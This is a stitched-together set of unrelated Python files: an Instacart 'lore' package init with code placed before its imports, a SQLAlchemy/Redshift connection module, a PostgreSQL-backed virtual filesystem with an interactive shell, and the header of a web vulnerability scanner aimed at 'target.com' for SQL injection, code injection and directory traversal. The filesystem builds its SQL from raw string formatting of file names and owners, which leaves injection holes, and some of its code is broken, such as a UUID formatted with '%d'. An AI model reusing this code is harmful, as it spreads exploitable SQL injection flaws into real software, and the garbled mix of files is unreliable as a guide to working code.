__copyright__ = 'Copyright ¬© 2017, Instacart'
__credits__ = ['Montana Low', 'Jeremy Stanley', 'Emmanuel Turlay']
__license__ = 'MIT'
__version__ = '0.4.45'                    
__maintainer__ = 'Montana Low'
__email__ = 'montana@instacart.com'
__status__ = 'Development Status :: 3 - Alpha'


def banner():
    import socket
    import getpass
    
    return '%s in %s on %s' % (
        ansi.foreground(ansi.GREEN, env.project),
        ansi.foreground(env.color, env.name),
        ansi.foreground(ansi.CYAN,
                        getpass.getuser() + '@' + socket.gethostname())
    )


lore_no_env = False
if hasattr(sys, 'lore_no_env'):
    lore_no_env = sys.lore_no_env

if len(sys.argv) > 1 and sys.argv[0][-4:] == 'lore' and sys.argv[1] in ['install', 'init']:
    lore_no_env = True

if not lore_no_env:
    # everyone else gets validated and launched on import
    env.validate()
    env.launch()

if env.launched():
    print(banner())
    logger.info(banner())
    logger.debug('python environment: %s' % env.prefix)

    if not lore_no_env:
        with timer('check requirements', logging.DEBUG):
            install_missing = env.name in [env.DEVELOPMENT, env.TEST]
            env.check_requirements(install_missing)
        
    try:
        with timer('numpy init', logging.DEBUG):
            import numpy
        
            numpy.random.seed(1)
            logger.debug('numpy.random.seed(1)')
    except ModuleNotFoundError as e:
        pass

    try:
        with timer('rollbar init', logging.DEBUG):
            import rollbar
            rollbar.init(
                os.environ.get("ROLLBAR_ACCESS_TOKEN", None),
                allow_logging_basic_config=False,
                environment=env.name,
                enabled=(env.name != env.DEVELOPMENT),
                handler='blocking',
                locals={"enabled": True})
    
            def report_error(exc_type, value, tb):
                import traceback
                logger.critical('Exception: %s' % ''.join(
                    traceback.format_exception(exc_type, value, tb)))
                if hasattr(sys, 'ps1'):
                    print(''.join(traceback.format_exception(exc_type, value, tb)))
                else:
                    rollbar.report_exc_info((exc_type, value, tb))
            sys.excepthook = report_error

    except ModuleNotFoundError as e:
        def report_error(exc_type, value, tb):
            import traceback
            logger.critical('Exception: %s' % ''.join(
                traceback.format_exception(exc_type, value, tb)))
            
        sys.excepthook = report_error
        pass

import hashlib
import inspect
import logging
import os
import re
import sys
import tempfile
import csv
import gzip
from datetime import datetime
from time import time
from io import StringIO
from sqlalchemy import event
from sqlalchemy.engine import Engine
from sqlalchemy.schema import DropTable
from sqlalchemy.ext.compiler import compiles

import pandas
import sqlalchemy

import lore
from lore.util import timer
from lore.stores import query_cached


logger = logging.getLogger(__name__)


@compiles(DropTable, 'postgresql')
def _compile_drop_table(element, compiler, **kwargs):
    return compiler.visit_drop_table(element) + ' CASCADE'


class Connection(object):
    UNLOAD_PREFIX = os.path.join(lore.env.name, 'unloads')
    IAM_ROLE = os.environ.get('IAM_ROLE', None)
    
    def __init__(self, url, **kwargs):
        for int_value in ['pool_size', 'pool_recycle', 'max_overflow']:
            if int_value in kwargs:
                kwargs[int_value] = int(kwargs[int_value])
        if 'poolclass' in kwargs:
            kwargs['poolclass'] = getattr(sqlalchemy.pool, kwargs['poolclass'])
        if '__name__' in kwargs:
            del kwargs['__name__']
        self._engine = sqlalchemy.create_engine(url, **kwargs)
        self._connection = None
        self._metadata = None
        self._transactions = []
    
    def __enter__(self):
        if self._connection is None:
            self._connection = self._engine.connect()
        self._transactions.append(self._connection.begin())
        return self
    
    def __exit__(self, type, value, traceback):
        transaction = self._transactions.pop()
        if type is None:
            transaction.commit()
        else:
            transaction.rollback()

    @staticmethod
    def path(filename, extension='.sql'):
        return os.path.join(
            lore.env.root, lore.env.project, 'extracts',
            filename + extension)

    def execute(self, sql=None, filename=None, **kwargs):
        self.__execute(self.__prepare(sql, filename), kwargs)

    def insert(self, table, dataframe, batch_size=None):
        if batch_size is None:
            batch_size = len(dataframe)

        if self._connection is None:
            self._connection = self._engine.connect()

        dataframe.to_sql(
            table,
            self._connection,
            if_exists='append',
            index=False,
            chunksize=batch_size
        )

    def replace(self, table, dataframe, batch_size=None):
        import migrate.changeset
        global _after_replace_callbacks
        
        with timer('REPLACE ' + table):
            suffix = datetime.now().strftime('_%Y%m%d%H%M%S').encode('utf-8')
            self.metadata
            temp = 'tmp_'.encode('utf-8')
            source = sqlalchemy.Table(table, self.metadata, autoload=True, autoload_with=self._engine)
            destination_name = 'tmp_' + hashlib.sha256(temp + table.encode('utf-8') + suffix).hexdigest()[0:56]
            destination = sqlalchemy.Table(destination_name, self.metadata, autoload=False)
            for column in source.columns:
                destination.append_column(column.copy())
            destination.create()

            original_names = {}
            for index in source.indexes:
                # make sure the name is < 63 chars with the suffix
                name = hashlib.sha256(temp + index.name.encode('utf-8') + suffix).hexdigest()[0:60]
                original_names[name] = index.name
                columns = []
                for column in index.columns:
                    columns.append(next(x for x in destination.columns if x.name == column.name))
                new = sqlalchemy.Index(name, *columns)
                new.unique = index.unique
                new.table = destination
                new.create(bind=self._connection)
            self.insert(destination.name, dataframe, batch_size=batch_size)
            self.execute("BEGIN; SET LOCAL statement_timeout = '1min'; ANALYZE %s; COMMIT;" % table)                    

            with self as transaction:
                backup = sqlalchemy.Table(table + '_b', self.metadata)
                backup.drop(bind=self._connection, checkfirst=True)
                source.rename(name=source.name + '_b', connection=self._connection)
                destination.rename(name=table, connection=self._connection)
                for index in source.indexes:
                    index.rename(index.name[0:-2] + '_b', connection=self._connection)
                for index in destination.indexes:
                    index.rename(original_names[index.name], connection=self._connection)
        
        for func in _after_replace_callbacks:
            func(destination, source)
        
    @property
    def metadata(self):
        if not self._metadata:
            self._metadata = sqlalchemy.MetaData(bind=self._engine)

        return self._metadata

    def select(self, sql=None, filename=None, **kwargs):
        cache = kwargs.pop('cache', False)
        sql = self.__prepare(sql, filename)
        return self._select(sql, kwargs, cache=cache)

    @query_cached
    def _select(self, sql, bindings):
        return self.__execute(sql, bindings).fetchall()

    def unload(self, sql=None, filename=None, **kwargs):
        cache = kwargs.pop('cache', False)
        sql = self.__prepare(sql, filename)
        return self._unload(sql, kwargs, cache=cache)
    
    @query_cached
    def _unload(self, sql, bindings):
        key = hashlib.sha1(str(sql).encode('utf-8')).hexdigest()

        match = re.match(r'.*?select\s(.*)from.*', sql, flags=re.IGNORECASE | re.UNICODE | re.DOTALL)
        if match:
            columns = []
            nested = 0
            potential = match[1].split(',')
            for column in potential:
                nested += column.count('(')
                nested -= column.count(')')
                if nested == 0:
                    columns.append(column.split()[-1].split('.')[-1].strip())
                elif column == potential[-1]:
                    column = re.split('from', column, flags=re.IGNORECASE)[0].strip()
                    columns.append(column.split()[-1].split('.')[-1].strip())
        else:
            columns = []
        logger.warning("Redshift unload requires poorly parsing column names from sql, found: {}".format(columns))

        sql = "UNLOAD ('" + sql.replace('\\', '\\\\').replace("'", "\\'") + "') "
        sql += "TO 's3://" + os.path.join(
            lore.io.bucket.name,
            self.UNLOAD_PREFIX,
            key,
            ''
        ) + "' "
        if Connection.IAM_ROLE:
            sql += "IAM_ROLE '" + Connection.IAM_ROLE + "' "
        sql += "DELIMITER '|' ADDQUOTES GZIP ALLOWOVERWRITE"
        if re.match(r'(.*?)(limit\s+\d+)(.*)', sql, re.IGNORECASE | re.UNICODE | re.DOTALL):
            logger.warning('LIMIT clause is not supported by unload, returning full set.')
            sql = re.sub(r'(.*?)(limit\s+\d+)(.*)', r'\1\3', sql, flags=re.IGNORECASE | re.UNICODE | re.DOTALL)
        self.__execute(sql, bindings)
        return key, columns

    @query_cached
    def load(self, key, columns):
        result = [columns]
        with timer('load:'):
            for entry in lore.io.bucket.objects.filter(
                Prefix=os.path.join(self.UNLOAD_PREFIX, key)
            ):
                temp = tempfile.NamedTemporaryFile()
                lore.io.bucket.download_file(entry.key, temp.name)
                with gzip.open(temp.name, 'rt') as gz:
                    result += list(csv.reader(gz, delimiter='|', quotechar='"'))
        
            return result
    
    @query_cached
    def load_dataframe(self, key, columns):
        with timer('load_dataframe:'):
            frames = []
            for entry in lore.io.bucket.objects.filter(
                Prefix=os.path.join(self.UNLOAD_PREFIX, key)
            ):
                temp = tempfile.NamedTemporaryFile()
                lore.io.bucket.download_file(entry.key, temp.name)
                dataframe = pandas.read_csv(
                    temp.name,
                    delimiter='|',
                    quotechar='"',
                    compression='gzip',
                    error_bad_lines=False
                )
                dataframe.columns = columns
                frames.append(dataframe)

            result = pandas.concat(frames)
            result.columns = columns
            buffer = StringIO()
            result.info(buf=buffer, memory_usage='deep')
            logger.info(buffer.getvalue())
            logger.info(result.head())
            return result
        
    def dataframe(self, sql=None, filename=None, **kwargs):
        cache = kwargs.pop('cache', False)
        sql = self.__prepare(sql, filename)
        dataframe = self._dataframe(sql, kwargs, cache=cache)
        buffer = StringIO()
        dataframe.info(buf=buffer, memory_usage='deep')
        logger.info(buffer.getvalue())
        logger.info(dataframe.head())
        return dataframe
        
    @query_cached
    def _dataframe(self, sql, bindings):
        with timer("dataframe:"):
            if self._connection is None:
                self._connection = self._engine.connect()
            dataframe = pandas.read_sql(sql=sql, con=self._connection, params=bindings)
            return dataframe

    def quote_identifier(self, identifier):
        return self._engine.dialect.identifier_preparer.quote(identifier)
        

    def __prepare(self, sql, filename):
        if sql is None and filename is not None:
            filename = Connection.path(filename, '.sql')
            logger.debug("READ SQL FILE: " + filename)
            with open(filename) as file:
                sql = file.read()
        # support mustache style bindings
        sql = re.sub(r'\{(\w+?)\}', r'%(\1)s', sql)
        return sql

    def __execute(self, sql, bindings):
        if self._connection is None:
            self._connection = self._engine.connect()
        return self._connection.execute(sql, bindings)


@event.listens_for(Engine, "before_cursor_execute", retval=True)
def comment_sql_calls(conn, cursor, statement, parameters, context, executemany):
    conn.info.setdefault('query_start_time', []).append(datetime.now())

    stack = inspect.stack()[1:-1]
    if sys.version_info.major == 3:
        stack = [(x.filename, x.lineno, x.function) for x in stack]
    else:
        stack = [(x[1], x[2], x[3]) for x in stack]

    paths = [x[0] for x in stack]
    origin = next((x for x in paths if lore.env.project in x), None)
    if origin is None:
        origin = next((x for x in paths if 'sqlalchemy' not in x), None)
    if origin is None:
        origin = paths[0]
    caller = next(x for x in stack if x[0] == origin)

    statement = "/* %s | %s:%d in %s */\n" % (lore.env.project, caller[0], caller[1], caller[2]) + statement
    logger.debug(statement)
    return statement, parameters


@event.listens_for(Engine, "after_cursor_execute")
def time_sql_calls(conn, cursor, statement, parameters, context, executemany):
    total = datetime.now() - conn.info['query_start_time'].pop(-1)
    logger.info("SQL: %s" % total)


_after_replace_callbacks = []
def after_replace(func):
    global _after_replace_callbacks
    _after_replace_callbacks.append(func)


import binascii
import copy
import datetime
import hashlib
import psycopg2
import pytz
import time
import uuid

from bzs import const

def get_current_time():
    """Gets the current time, in float since epoch."""
    # return datetime.datetime.now(tz=pytz.timezone(const.get_const('time-zone')))
    return float(time.time())

def get_new_uuid(uuid_, uuid_list=None):
    """Creates a new UUID that is not in 'uuid_list' if given."""
    if not uuid_:
        uuid_ = uuid.uuid4().hex
        if type(uuid_list) in [set, dict]:
            while uuid_ in uuid_list:
                uuid_ = uuid.uuid4().hex
    return uuid_

################################################################################

class DatabaseType:
    def __init__(self):
        self.connect_params = dict(
            database=const.get_const('db-name'),
            user=const.get_const('db-user'),
            password=const.get_const('db-password'),
            host=const.get_const('db-host-addr'),
            port=const.get_const('db-host-port')
        )
        self._db = psycopg2.connect(**self.connect_params)
        self._cur = None
        return

    def execute(self, command, **args):
        self._cur = self._db.cursor()
        try:
            self._cur.execute(command, **args)
            final_arr = self._cur.fetchall()
        except psycopg2.ProgrammingError:
            # We'll take this as granted... though risky.
            final_arr = None
        self._db.commit()
        self._cur.close()
        return final_arr

    def init_db(self):
        # Purge database of obsolete tables
        self.execute("""
            DROP TABLE core;
        """)
        self.execute("""
            DROP TABLE users;
        """)
        self.execute("""
            DROP TABLE file_system;
        """)
        self.execute("""
            DROP TABLE file_storage;
        """)
        # Creating new tables in order to function
        self.execute("""
            CREATE TABLE core (
                index   TEXT,
                data    BYTEA
            );
            CREATE TABLE users (
                handle          TEXT,
                password        TEXT,
                usergroups      TEXT,
                ip_address      TEXT[],
                events          TEXT[],
                usr_name        TEXT,
                usr_description TEXT,
                usr_email       TEXT,
                usr_followers   TEXT[],
                usr_friends     TEXT[]
            );
            CREATE TABLE file_system(
                uuid        TEXT,
                file_name   TEXT,
                owner       TEXT,
                upload_time DOUBLE PRECISION,
                sub_folders TEXT[],
                sub_files   TEXT[][]
            );
            CREATE TABLE file_storage (
                uuid    TEXT,
                size    BIGINT,
                count   BIGINT,
                hash    TEXT,
                content BYTEA
            );
        """)
        return
    pass

Database = DatabaseType()

################################################################################

class FileStorageType:
    st_uuid_idx = dict()
    st_hash_idx = dict()
    # Database entry
    st_db = Database
    # Hashing algorithm, could be md5, sha1, sha224, sha256, sha384, sha512
    # sha384 and sha512 are not recommended due to slow speeds on 32-bit computers
    hash_algo = hashlib.sha256

    class UniqueFile:
        def __init__(self, uuid_=None, size=0, count=1, hash_=None, master=None):
            self.master = master
            self.uuid = get_new_uuid(uuid_, self.master.st_uuid_idx)
            self.master.st_uuid_idx[self.uuid] = self
            self.size = size
            self.count = count # The number of references
            self.hash = hash_ # Either way... must specify this!
            self.master.st_hash_idx[self.hash] = self
            # Will not contain content, would be indexed in SQL.
            return
        pass

    def __init__(self, db=Database):
        return self.load_sql(db)

    def load_sql(self, db=Database):
        """Loads index of all stored UniqueFiles in database."""
        self.st_db = db
        for item in self.st_db.execute("SELECT uuid, size, count, hash FROM file_storage;"):
            s_uuid, s_size, s_count, s_hash = item
            s_fl = self.UniqueFile(s_uuid, s_size, s_count, s_hash, self)
            # Inject into indexer
            self.st_uuid_idx[s_uuid] = s_fl
            self.st_hash_idx[s_hash] = s_fl
        return

    def new_unique_file(self, content):
        """Creates a UniqueFile, and returns its UUID in string."""
        n_uuid = get_new_uuid(None, self.st_uuid_idx)
        n_size = len(content)
        n_count = 1
        n_hash = self.hash_algo(content).hexdigest()
        u_fl = self.UniqueFile(n_uuid, n_size, n_count, n_hash, master=self)
        # Done indexing, now proceeding to process content into SQL
        content = binascii.hexlify(content).decode('ascii')
        # self.st_db.execute('INSERT INTO file_storage (uuid, size, count, hash, content) VALUES ("%s", %d, %d, "%s", E"\\\\x%s");' % (n_uuid, n_size, n_count, n_hash, content))
        self.st_db.execute("INSERT INTO file_storage (uuid, size, count, hash, content) VALUES ('%s', %d, %d, '%s', E'\\x%s');" % (n_uuid, n_size, n_count, n_hash, content))
        # Injecting file into main indexer
        self.st_uuid_idx[n_uuid] = u_fl
        self.st_hash_idx[n_hash] = u_fl
        return n_uuid

    def get_content(self, uuid_):
        try:
            u_fl = self.st_uuid_idx[uuid_]
        except Exception:
            return b''
        # Got file handle, now querying file data
        content = self.st_db.execute("SELECT content FROM file_storage WHERE uuid = '%d';" % uuid_)                    
        return content
    pass

FileStorage = FileStorageType()

################################################################################

class FilesystemType:
    """This is a virtual filesystem based on a relational PostgreSQL database.
    We might call it a SQLFS. Its tree-topological structure enables it to index
    files and find siblings quickly. Yet without the B-Tree optimization it would
    not be easy to maintain a high performance.
    """
    fs_uuid_idx = dict()
    fs_root = None
    fs_db = None

    class fsNode:
        """This is a virtual node on a virtual filesystem SQLFS. The virtual node contains
        the following data:

            uuid        - The unique identifier: if node is a directory, then this uuid
                          would be the identifier pointing to the directory; if node is
                          a file, this identifier would be pointing to the UUID among
                          the actual files instead of the filesystem.
            is_dir      - Whether is a directory or not
            filename    - The actual file / directory name given by the user
            upload_time - The time uploaded / copied / moved to server
            f_uuid      - If a file them this indicates its FileStorage UUID.

        Other data designed to maintain the structure of the node includes:

            master        - The filesystem itself.
            sub_folder    - Removed after filesystem init, temporary use only.
            sub_files     - Removed after filesystem init, temporary use only.
            sub_items     - Set of children.
            sub_names_idx - Contains same data as sub_items, but indexed by name.

        Do process with caution, and use exported methods only.
        """

        def __init__(self, is_dir, file_name, owner, uuid_=None, upload_time=None, sub_folders=set(), sub_files=set(), f_uuid=None, master=None):
            # The filesystem / master of the node
            self.master = master
            # Assigning data
            self.is_dir = is_dir
            self.file_name = file_name
            self.owner = owner
            # Generate Universally Unique Identifier
            self.uuid = get_new_uuid(uuid_, master.fs_uuid_idx)
            master.fs_uuid_idx[self.uuid] = self
            # Get upload time
            self.upload_time = upload_time or get_current_time()
            if not self.is_dir:
                self.sub_folders = set()
                self.sub_files = set()
                self.f_uuid = f_uuid
            else:
                # Folder initialization needs to be accounted after init as whole by the main caller
                self.sub_folders = sub_folders # Temporary
                self.sub_files = sub_files # Temporary
            # This is a traversal thing...
            self.parent = None
            self.sub_items = set()
            self.sub_names_idx = dict()
            return
        pass

    def __init__(self, db=Database):
        return self.load_sqlfs(db)

    def load_sqlfs(self, db=Database):
        self.fs_db = db
        for item in self.fs_db.execute("SELECT uuid, file_name, owner, upload_time, sub_folders, sub_files FROM file_system"):
            # Splitting tuple into parts
            uuid_, file_name, owner, upload_time, sub_folders, sub_files = item
            # Getting sub files which are expensive stored separately
            n_sub_files = set()
            for fil_idx in sub_files:
                # This is where the order goes, BEAWARE
                s_uuid = fil_idx[0]
                s_file_name = fil_idx[1]
                s_owner = fil_idx[2]
                try:
                    s_upload_time = float(fil_idx[3])
                except:
                    s_upload_time = get_current_time()
                s_f_uuid = fil_idx[4]
                # Pushing...
                s_file = self.fsNode(False, s_file_name, s_owner, s_uuid, s_upload_time, f_uuid=s_f_uuid, master=self)
                n_sub_files.add(s_file)
                self.fs_uuid_idx[s_uuid] = s_file
            # Getting sub folders as a set but not templating them
            n_sub_folders = set() # Since reference is passed, should not manipulate this further
            for fol_idx in sub_folders:
                n_sub_folders.add(fol_idx)
            fold_elem = self.fsNode(True, file_name, owner, uuid_, upload_time, n_sub_folders, n_sub_files, master=self)
            self.fs_uuid_idx[uuid_] = fold_elem
        # Done importing from SQL database, now attempting to refurbish connexions
        for uuid_ in self.fs_uuid_idx:
            item = self.fs_uuid_idx[uuid_]
            if not item.is_dir:
                continue
            # Asserted that it was a folder.
            for n_sub in item.sub_files:
                item.sub_items.add(n_sub)
                item.sub_names_idx[n_sub.file_name] = n_sub
            for n_sub_uuid in item.sub_folders:
                try:
                    n_sub = self.fs_uuid_idx[n_sub_uuid]
                    item.sub_items.add(n_sub)
                    item.sub_names_idx[n_sub.file_name] = n_sub
                except Exception:
                    pass
            del item.sub_files
            del item.sub_folders
        # Fixing parental occlusions
        def iterate_fsnode(node):
            for item in node.sub_items:
                if item.parent:
                    continue
                # Never iterated before
                item.parent = node
                iterate_fsnode(item)
            return
        for uuid_ in self.fs_uuid_idx: # This would fix all nodes...
            item = self.fs_uuid_idx[uuid_]
            iterate_fsnode(item)
        # Finding root and finishing parent connexions
        for uuid_ in self.fs_uuid_idx: # Takes the first element that ever occured to me
            item = self.fs_uuid_idx[uuid_]
            while item.parent:
                item = item.parent
            self.fs_root = item
            break
        else:
            self.make_root()
        # Traversing root for filename indexing
        def iterate_node_fn(node):
            for item in node.sub_items:
                node.sub_names_idx[item.file_name]
        # All done, finished initialization
        return

    def make_root(self):
        item = self.fsNode(True, '', 'System', master=self)
        del item.sub_files
        del item.sub_folders
        item.sub_items = set()
        item.parent = None
        # Done generation, inserting.
        self.fs_root = item
        self.fs_uuid_idx[item.uuid] = item
        # Inserting to SQL.
        self.fs_db.execute("INSERT INTO file_system (uuid, file_name, owner, upload_time, sub_folders, sub_files) VALUES ('%s', '%s', '%s', %f, '{}', '{}');" % (item.uuid, item.file_name, item.owner, item.upload_time))
        return

    def locate(self, path, parent=None):
        """Locate the fsNode() of the location 'path'. If 'parent' is given and
        as it should be a fsNode(), the function look to the nodes directly
        under this, non-recursively."""
        # On the case it is a referring location, path should be str.
        if parent:
            try:
                item = parent.sub_names_idx[path]
            except Exception:
                return None
            return item
        # And it is not such a location.
        # We assert that path should be list().
        if type(path) == str:
            path = path.split('/')
            while '' in path:
                path.remove('')
        # Now got array, traversing...
        item = self.fs_root
        while path:
            try:
                item = item.sub_names_idx[path[0]]
            except Exception:
                return None # This object does not exist.
            path = path[1:]
        return item

    def _sqlify_fsnode(self, item):
        n_uuid = item.uuid
        n_file_name = item.file_name
        n_owner = item.owner
        n_upload_time = item.upload_time
        n_sub_folders = list()
        n_sub_files = list()
        for i_sub in item.sub_items:
            if i_sub.is_dir:
                n_sub_folders.append("\"%s\"" % i_sub.uuid)
            else:
                s_attr = "{%s, %s, %s, %s, %s}" % (
                    "\"%s\"" % i_sub.uuid,
                    "\"%s\"" % i_sub.file_name,
                    "\"%s\"" % i_sub.owner,
                    "\"%f\"" % i_sub.upload_time,
                    "\"%s\"" % i_sub.f_uuid
                )
                n_sub_files.append(s_attr)
        # Formatting string
        n_sub_folders_str = "'{" + ", ".join(i for i in n_sub_folders) + "}'"
        n_sub_files_str = "'{" + ", ".join(i for i in n_sub_files) + "}'"
        return (n_uuid, n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str)

    def _update_in_db(self, item):
        # This applies to items in the
        # We assert that item should be Node.
        if type(item) == str:
            item = self.locate(item)
        if not item:
            return False
        # Giving a few but crucial assertions...
        if not item.is_dir:
            item = item.parent
            if not item.is_dir:
                return False # I should raise, by a matter of fact
        # Collecting data
        n_uuid, n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str = self._sqlify_fsnode(item)
        # Uploading / committing data
        command = "UPDATE file_system SET file_name = '%s', owner = '%s', upload_time = %f, sub_folders = %s, sub_files = %s WHERE uuid = '%s';" % (n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str, n_uuid)
        self.fs_db.execute(command)
        return True

    def _insert_in_db(self, item):
        """Create filesystem record of directory 'item' inside database."""
        if not item.is_dir:
            return False # Must be directory...
        n_uuid, n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str = self._sqlify_fsnode(item)
        # Uploading / committing data
        self.fs_db.execute("INSERT INTO file_system (uuid, file_name, owner, upload_time, sub_folders, sub_files) VALUES ('%s', '%s', '%s', %f, %s, %s);" % (n_uuid, n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str))
        return

    def get_content(self, item):
        """Gets binary content of the object (must be file) and returns the actual
        content in bytes."""
        if type(item) == str:
            item = self.locate(item)
        if not item:
            return b''
        if item.is_dir:
            return b''
        return FileStorage.get_content(item.f_uuid)

    def _remove_recursive(self, item):
        """Removes content of a single object and recursively call all its
        children for recursive removal."""
        # We assert item is fsNode().
        # Remove recursively.
        for i_sub in item.sub_items:
            self._remove_recursive(i_sub)
        # Delete itself from filesystem.
        del self.fs_uuid_idx[item.uuid]
        # Delete itself from SQL database.
        self.fs_db.execute("DELETE FROM file_system WHERE uuid = '%s';" % item.uuid)
        return

    def remove(self, path):
        """Removes (recursively) all content of the folder / file itself and
        all its subdirectories."""
        if type(path) == str:
            path = self.locate(path)
            if not path:
                return False
        # Done assertion, path is now fsNode().
        par = path.parent
        self._remove_recursive(path)
        if par:
            par.sub_items.remove(path)
            del par.sub_names_idx[path.file_name]
            self._update_in_db(par)
        return True

    def _copy_recursive(self, item, target_par, new_owner):
        """Copies content of a single object and recursively call all its
        children for recursive copy, targeted as a child under target_par."""
        # We assert item, target_par are all fsNode().
        target_node = target_par.sub_names_idx[item.file_name]
        for i_sub in item.sub_items:
            i_sub.parent = item
            item.sub_names_idx[i_sub.file_name] = i_sub
            self._copy_recursive(i_sub, target_node, new_owner)
        # Insert into SQL database
        item.uuid = get_new_uuid(None, self.fs_uuid_idx)
        self.fs_uuid_idx[item.uuid] = item
        item.upload_time = get_current_time()
        if new_owner:
            item.owner = new_owner # Assignment
        if item.is_dir:
            self._insert_in_db(item)
        return

    def copy(self, source, target_parent, new_owner=None):
        """Copies content of 'source' (recursively) and hang the target object
        that was copied under the node 'target_parent'. If rename required please call
        the related functions separatedly."""
        if type(source) == str:
            source = self.locate(source)
        if type(target_parent) == str:
            target_parent = self.locate(target_parent)
        if not source or not target_parent:
            return False
        # Done assertion, now proceed with deep copy
        target = copy.deepcopy(source)
        target.parent = target_parent
        target_parent.sub_items.add(target)
        target_parent.sub_names_idx[target.file_name] = target
        self._copy_recursive(target, target_parent, new_owner)
        # Update target_parent data and return
        self._update_in_db(target_parent)
        return True

    def move(self, source, target_parent):
        if type(source) == str:
            source = self.locate(source)
        if type(target_parent) == str:
            target_parent = self.locate(target_parent)
        if not source or not target_parent:
            return False
        # Moving an re-assigning tree structures
        par = source.parent
        par.sub_items.remove(source)
        del par.sub_names_idx[source.file_name]
        source.parent = target_parent
        target_parent.sub_items.add(source)
        target_parent.sub_names_idx[source.file_name] = source
        # Updating SQL database.
        self._update_in_db(par)
        self._update_in_db(target_parent)
        return

    def rename(self, item, file_name):
        """Renames object 'item' into file_name."""
        if type(item) == str:
            item = self.locate(item)
            if not item:
                return False
        if item.parent:
            del item.parent.sub_names_idx[item.file_name]
            item.file_name = file_name
            item.parent.sub_names_idx[item.file_name] = item
        if item.is_dir:
            self._update_in_db(item)
        else:
            self._update_in_db(item.parent)
        return True

    def chown(self, item, owner):
        """Assign owner of 'item' to new owner, recursively."""
        if type(item) == str:
            item = self.locate(item)
            if not item:
                return False
        def _chown_recursive(item_, owner_):
            for sub_ in item_.sub_items:
                _chown_recursive(sub_, owner_)
            item_.owner = owner_
            if item_.is_dir:
                self._update_in_db(item_)
            return
        _chown_recursive(item, owner)
        if not item.is_dir:
            self._update_in_db(item.parent)
        return True

    def mkfile(self, path_parent, file_name, owner, content):
        """Inject object into filesystem, while passing in content. The content
        itself would be indexed in FileStorage."""
        if type(path_parent) == str:
            path_parent = self.locate(path_parent)
            if not path_parent:
                return False
        n_uuid = FileStorage.new_unique_file(content)
        n_fl = self.fsNode(False, file_name, owner, f_uuid=n_uuid, master=self)
        # Updating tree connexions
        n_fl.parent = path_parent
        path_parent.sub_items.add(n_fl)
        path_parent.sub_names_idx[file_name] = n_fl
        self._update_in_db(path_parent)
        # Indexing and return
        self.fs_uuid_idx[n_fl.uuid] = n_fl
        return True

    def mkdir(self, path_parent, file_name, owner):
        """Inject folder into filesystem."""
        if type(path_parent) == str:
            path_parent = self.locate(path_parent)
            if not path_parent:
                return False
        n_fl = self.fsNode(True, file_name, owner, master=self)
        # Updating tree connexions
        n_fl.parent = path_parent
        path_parent.sub_items.add(n_fl)
        path_parent.sub_names_idx[file_name] = n_fl
        self._update_in_db(path_parent)
        self._insert_in_db(n_fl)
        # Indexing and return
        self.fs_uuid_idx[n_fl.uuid] = n_fl
        return True

    def listdir(self, path):
        """Creates a list of files in the directory 'path'. Attributes of the returned
        result contains:

            file-name   - File name
            file-size   - File size
            is-dir      - Whether is directory
            owner       - The handle of the owner
            upload-time - Time uploaded, in float since epoch.

        The result should always be a list, and please index it with your own
        habits or modify the code."""
        if type(path) == str:
            path = self.locate(path)
            if not path:
                return []
        # List directory, given the list(dict()) result...
        dirs = list()
        for item in path.sub_items:
            attrib = dict()
            # try:
            attrib['file-name'] = item.file_name
            attrib['file-size'] = 0 if item.is_dir else FileStorage.st_uuid_idx[item.f_uuid].size
            attrib['is-dir'] = item.is_dir
            attrib['owner'] = item.owner
            attrib['upload-time'] = item.upload_time
            # except:
            #     continue
            dirs.append(attrib)
        # Give the results to downstream
        return dirs

    def shell(self):
        """Interactive shell for manipulating SQLFS. May be integrated into other
        utilites in the (far) futuure. Possible commands are:

            ls             - List content of current directory.
            cat name       - View binary content of the object 'name'.
            cd             - Change CWD into the given directory, must be relative.
                             or use '..' to go to parent directory.
            chown src usr  - Change ownership (recursively) of object 'src' to 'usr'.
            rename src nam - Rename file / folder 'src' to 'nam'.
            mkdir name     - Make directory of 'name' under this directory.
            mkfile name    - Make empty file of 'name' under this directory.
            rm name        - Remove (recursively) object of 'name' under this directory.
            cp src dest    - Copy object 'src' to under 'dest (actual)' as destination.
            mv src dest    - Move object 'src' to under 'dest (actual)' as destination.
            q              - Exit shell.

        Would be done in a infinite loop. Use 'q' to leave."""
        cwd = self.fs_root
        cuser = 'system'
        cwd_list = ['']
        while True:
            cwd_fl = ''.join((i + '/') for i in cwd_list)
            print('root@postgres %s$ ' % cwd_fl, end='')
            cmd_input = input()
            cmd = cmd_input.split(' ')
            op = cmd[0]
            if op == 'ls':
                res = self.listdir(cwd)
                # Prettify the result
                print('Owner       Upload Time         Size            Filename            ')
                print('--------------------------------------------------------------------')
                for item in res:
                    print('%s%s%s%s' % (item['owner'].ljust(12), str(int(item['upload-time'])).ljust(20), str(item['file-size'] if not item['is-dir'] else '').ljust(16), item['file-name']))
                print('Total: %d' % len(res))
                print('')
            elif op == 'cat':
                dest = self.locate(cmd[1], parent=cwd)
                print(self.get_content(dest))
            elif op == 'cd':
                if cmd[1] == '..':
                    cwd_dest = cwd.parent
                    if cwd_dest:
                        cwd = cwd_dest
                        cwd_list = cwd_list[:-1]
                else:
                    cwd_dest = cwd.sub_names_idx[cmd[1]]
                    if cwd_dest:
                        cwd = cwd_dest
                        cwd_list.append(cmd[1])
            elif op == 'chown':
                dest = self.locate(cmd[1], parent=cwd)
                self.chown(dest, cmd[2])
            elif op == 'rename':
                dest = self.locate(cmd[1], parent=cwd)
                self.rename(dest, cmd[2])
            elif op == 'mkdir':
                self.mkdir(cwd, cmd[1], cuser)
            elif op == 'mkfile':
                self.mkfile(cwd, cmd[1], cuser, b'')
            elif op == 'rm':
                self.remove(self.locate(cmd[1], parent=cwd))
            elif op == 'cp':
                src = self.locate(cmd[1], parent=cwd)
                self.copy(src, cmd[2])
            elif op == 'mv':
                src = self.locate(cmd[1], parent=cwd)
                self.move(src, cmd[2])
            elif op == 'q':
                break
            else:
                print('Unknown command "%s".' % op)
        return
    pass

Filesystem = FilesystemType()

################################################################################


import requests
import ssci
import oRedirect 
import os
import re 
import sqli
import cmd
import dirtraversal
from shutil import copy,rmtree
from datetime import datetime
import difflib


BASE_URL = "http://target.com"
sql_injection = "SQL Injection"
server_injection = "Server Side Code Injection"
directory_traversal = "Directory Traversal"
